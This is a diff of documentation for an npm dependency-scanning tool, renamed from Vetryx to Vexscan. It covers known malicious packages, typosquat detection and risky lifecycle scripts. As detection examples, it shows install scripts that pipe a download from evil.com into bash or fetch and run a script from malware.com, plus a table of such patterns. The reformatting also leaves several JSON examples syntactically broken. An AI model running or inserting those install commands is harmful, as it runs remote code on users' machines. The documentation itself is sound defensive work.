@@ -1,25 +1,27 @@
 # Dependency Scanning
 
-Dependency scanning analyzes `package.json` files to detect supply chain attacks. These attacks have compromised millions of systems through malicious npm packages.
+Dependency scanning analyzes `package.json` files to detect supply chain attacks. These attacks have compromised
+millions of systems through malicious npm packages.
 
 ## Enable Dependency Scanning
 
 ```bash
-vetryx scan ./project --deps
+vexscan scan ./project --deps
 ```
 
 ## The Threat
 
 npm supply chain attacks are devastating:
 
-| Attack | Impact | Year |
-|--------|--------|------|
-| event-stream | Stole cryptocurrency from Copay wallet users | 2018 |
+| Attack       | Impact                                         | Year |
+|--------------|------------------------------------------------|------|
+| event-stream | Stole cryptocurrency from Copay wallet users   | 2018 |
 | ua-parser-js | Installed crypto miners on millions of systems | 2021 |
-| node-ipc | Deleted files on Russian/Belarusian systems | 2022 |
-| colors/faker | Broke thousands of production systems | 2022 |
+| node-ipc     | Deleted files on Russian/Belarusian systems    | 2022 |
+| colors/faker | Broke thousands of production systems          | 2022 |
 
 A single `npm install` can execute arbitrary code via:
+
 - `preinstall` / `install` / `postinstall` scripts
 - Malicious code in the package itself
 - Transitive dependencies you never explicitly installed
@@ -28,37 +30,45 @@ A single `npm install` can execute arbitrary code via:
 
 ### 1. Known Malicious Packages (`DEP-MALICIOUS-001`)
 
-Vetryx maintains a database of 35+ known malicious packages:
+Vexscan maintains a database of 35+ known malicious packages:
 
 ```javascript
 // package.json - DETECTED
 {
-    "dependencies": {
-        "event-stream": "3.3.6",    // Cryptocurrency stealer
-        "ua-parser-js": "0.7.29",   // Cryptominer + password stealer
-        "crossenv": "1.0.0"         // Typosquat, steals npm tokens
+    "dependencies"
+:
+    {
+        "event-stream"
+    :
+        "3.3.6",    // Cryptocurrency stealer
+            "ua-parser-js"
+    :
+        "0.7.29",   // Cryptominer + password stealer
+            "crossenv"
+    :
+        "1.0.0"         // Typosquat, steals npm tokens
     }
 }
 ```
 
 **Packages in the database:**
 
-| Package | Type | Threat |
-|---------|------|--------|
-| event-stream@3.3.6 | Supply chain | Cryptocurrency theft |
-| flatmap-stream | Supply chain | Injected into event-stream |
-| ua-parser-js@0.7.29,0.8.0,1.0.0 | Supply chain | Cryptominer + credential theft |
-| coa@2.0.3+ | Supply chain | Password stealer |
-| rc@1.2.9+ | Supply chain | Similar to coa attack |
-| crossenv | Typosquat | Steals environment variables |
-| colors@1.4.1+ | Sabotage | Infinite loop (protestware) |
-| faker@6.6.6 | Sabotage | Intentionally corrupted |
-| node-ipc@10.1.x | Protestware | Deletes files (geolocation-based) |
-| discord-selfbot-v14 | Data theft | Discord token stealer |
-| eslint-scope@3.7.2 | Supply chain | npm credential theft |
-| getcookies | Data theft | Cookie stealer |
-| nodemailer-js | Typosquat | Backdoor |
-| socketio | Typosquat | Data theft |
+| Package                         | Type         | Threat                            |
+|---------------------------------|--------------|-----------------------------------|
+| event-stream@3.3.6              | Supply chain | Cryptocurrency theft              |
+| flatmap-stream                  | Supply chain | Injected into event-stream        |
+| ua-parser-js@0.7.29,0.8.0,1.0.0 | Supply chain | Cryptominer + credential theft    |
+| coa@2.0.3+                      | Supply chain | Password stealer                  |
+| rc@1.2.9+                       | Supply chain | Similar to coa attack             |
+| crossenv                        | Typosquat    | Steals environment variables      |
+| colors@1.4.1+                   | Sabotage     | Infinite loop (protestware)       |
+| faker@6.6.6                     | Sabotage     | Intentionally corrupted           |
+| node-ipc@10.1.x                 | Protestware  | Deletes files (geolocation-based) |
+| discord-selfbot-v14             | Data theft   | Discord token stealer             |
+| eslint-scope@3.7.2              | Supply chain | npm credential theft              |
+| getcookies                      | Data theft   | Cookie stealer                    |
+| nodemailer-js                   | Typosquat    | Backdoor                          |
+| socketio                        | Typosquat    | Data theft                        |
 
 ### 2. Typosquatting Detection (`DEP-TYPOSQUAT-001`)
 
@@ -67,27 +77,40 @@ Detects packages with names suspiciously similar to popular packages:
 ```javascript
 // package.json - DETECTED
 {
-    "dependencies": {
-        "loadsh": "1.0.0",       // Typosquat of "lodash"
-        "expresss": "1.0.0",     // Typosquat of "express"
-        "axois": "1.0.0",        // Typosquat of "axios"
-        "lodash-js": "1.0.0",    // Suspicious suffix
-        "react-node": "1.0.0"    // Suspicious suffix
+    "dependencies"
+:
+    {
+        "loadsh"
+    :
+        "1.0.0",       // Typosquat of "lodash"
+            "expresss"
+    :
+        "1.0.0",     // Typosquat of "express"
+            "axois"
+    :
+        "1.0.0",        // Typosquat of "axios"
+            "lodash-js"
+    :
+        "1.0.0",    // Suspicious suffix
+            "react-node"
+    :
+        "1.0.0"    // Suspicious suffix
     }
 }
 ```
 
 **Detection techniques:**
 
-| Technique | Example | Protected Packages |
-|-----------|---------|-------------------|
-| Levenshtein distance ≤2 | lodahs → lodash | 150+ popular packages |
-| Suffix addition | lodash-js, express-node | -js, -node, -npm, -lib |
-| Hyphen removal | crossenv → cross-env | All hyphenated packages |
-| Hyphen/underscore swap | cross_env → cross-env | All hyphenated packages |
-| Doubled letters | expresss → express | All packages |
+| Technique               | Example                 | Protected Packages      |
+|-------------------------|-------------------------|-------------------------|
+| Levenshtein distance ≤2 | lodahs → lodash         | 150+ popular packages   |
+| Suffix addition         | lodash-js, express-node | -js, -node, -npm, -lib  |
+| Hyphen removal          | crossenv → cross-env    | All hyphenated packages |
+| Hyphen/underscore swap  | cross_env → cross-env   | All hyphenated packages |
+| Doubled letters         | expresss → express      | All packages            |
 
 **Protected packages include:**
+
 - Build tools: webpack, babel, typescript, esbuild, vite
 - Frameworks: react, vue, angular, express, fastify, nest
 - Testing: jest, mocha, cypress, playwright, vitest
@@ -102,25 +125,33 @@ Detects dangerous patterns in npm lifecycle scripts:
 ```javascript
 // package.json - DETECTED
 {
-    "scripts": {
-        "postinstall": "curl https://evil.com/payload.sh | bash",
-        "preinstall": "node -e \"require('child_process').exec('whoami')\"",
-        "install": "wget https://malware.com/script.sh && sh script.sh"
+    "scripts"
+:
+    {
+        "postinstall"
+    :
+        "curl https://evil.com/payload.sh | bash",
+            "preinstall"
+    :
+        "node -e \"require('child_process').exec('whoami')\"",
+            "install"
+    :
+        "wget https://malware.com/script.sh && sh script.sh"
     }
 }
 ```
 
 **Dangerous patterns detected:**
 
-| Pattern | Risk |
-|---------|------|
-| `curl ... \| bash` | Downloads and executes remote code |
-| `wget ... && sh` | Downloads and executes scripts |
-| `node -e` | Inline code execution |
-| `bash -c`, `sh -c` | Shell command execution |
-| `\| base64` | Obfuscation |
-| `>/dev/null 2>&1` | Hiding activity |
-| Command substitution `$()` | Dynamic command execution |
+| Pattern                    | Risk                               |
+|----------------------------|------------------------------------|
+| `curl ... \| bash`         | Downloads and executes remote code |
+| `wget ... && sh`           | Downloads and executes scripts     |
+| `node -e`                  | Inline code execution              |
+| `bash -c`, `sh -c`         | Shell command execution            |
+| `\| base64`                | Obfuscation                        |
+| `>/dev/null 2>&1`          | Hiding activity                    |
+| Command substitution `$()` | Dynamic command execution          |
 
 ## Version Matching
 
@@ -128,30 +159,38 @@ The malicious package database supports:
 
 ```javascript
 // Exact version match
-"event-stream": "3.3.6"     // Matches database entry "3.3.6"
+"event-stream"
+:
+"3.3.6"     // Matches database entry "3.3.6"
 
 // Prefix stripping
-"event-stream": "^3.3.6"    // ^ stripped, matches "3.3.6"
-"event-stream": "~3.3.6"    // ~ stripped, matches "3.3.6"
+"event-stream"
+:
+"^3.3.6"    // ^ stripped, matches "3.3.6"
+"event-stream"
+:
+"~3.3.6"    // ~ stripped, matches "3.3.6"
 
 // Wildcard (all versions)
-"crossenv": "1.0.0"         // crossenv has no version restriction
+"crossenv"
+:
+"1.0.0"         // crossenv has no version restriction
 ```
 
 ## Configuration
 
 ```rust
 DependencyAnalyzerConfig {
-    check_typosquat: true,        // Enable typosquatting detection
-    check_install_scripts: true,   // Check lifecycle scripts
-    typosquat_threshold: 2,        // Max Levenshtein distance
+check_typosquat: true,        // Enable typosquatting detection
+check_install_scripts: true,   // Check lifecycle scripts
+typosquat_threshold: 2,        // Max Levenshtein distance
 }
 ```
 
 ## Example Output
 
 ```
-vetryx scan ./compromised-project --deps
+vexscan scan ./compromised-project --deps
 
 CRITICAL  DEP-MALICIOUS-001  Known malicious package: event-stream
           File: package.json:5
@@ -181,6 +220,7 @@ Found 3 issues (1 critical, 2 high)
 ### 1. Use Lockfiles
 
 Always commit `package-lock.json` or `yarn.lock`:
+
 ```bash
 npm ci  # Uses exact versions from lockfile
 ```
@@ -195,26 +235,29 @@ npm install untrusted-package --ignore-scripts
 
 ```bash
 npm audit
-vetryx scan . --deps
+vexscan scan . --deps
 ```
 
 ### 4. Use Scoped Packages
 
 Scoped packages (`@org/package`) are harder to typosquat:
+
 ```json
 {
-    "dependencies": {
-        "@lodash/lodash": "4.17.21"  // Harder to typosquat
-    }
+  "dependencies": {
+    "@lodash/lodash": "4.17.21"
+    // Harder to typosquat
+  }
 }
 ```
 
 ### 5. Review New Dependencies
 
 Before adding a package:
+
 1. Check npm page for popularity, maintenance, and issues
 2. Review the package's `package.json` for install scripts
-3. Scan with Vetryx: `vetryx scan node_modules/new-package --deps`
+3. Scan with Vexscan: `vexscan scan node_modules/new-package --deps`
 
 ## Limitations
 
